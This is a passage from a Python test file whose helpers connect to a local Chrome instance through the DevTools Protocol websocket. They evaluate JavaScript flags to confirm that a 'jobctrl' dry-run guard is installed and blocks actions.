                    "Runtime.evaluate",
                    {
                        "expression": "Boolean(window.__jobctrl_dryrun_blocked)",
                        "returnByValue": True,
                    },
                )
            )
            if _cdp_value(result) is True:
                return True
            time.sleep(0.1)
        return False
    finally:
        ws.close()


def _wait_for_dry_run_guard(port: int) -> None:
    deadline = time.time() + 5
    while time.time() < deadline:
        if _evaluate_boolean(port, "Boolean(window.__jobctrl_dryrun_installed)"):
            return
        time.sleep(0.1)
    raise AssertionError("dry-run guard did not install on Chrome target")


def _evaluate_boolean(port: int, expression: str) -> bool:
    websocket = pytest.importorskip("websocket")
    ws = websocket.create_connection(
        _wait_for_page_target(port),
        timeout=5,
        suppress_origin=True,
    )
    try:
        ws.send(
            json.dumps(
                {
                    "id": 1,
                    "method": "Runtime.evaluate",
                    "params": {"expression": expression, "returnByValue": True},
                }
            )
        )
        deadline = time.time() + 5
        while time.time() < deadline:
            message = json.loads(ws.recv())
            if message.get("id") == 1:
                return bool(_cdp_value(message))
        return False
    finally:
        ws.close()


def _cdp_value(message: dict) -> object:
    return message.get("result", {}).get("result", {}).get("value")
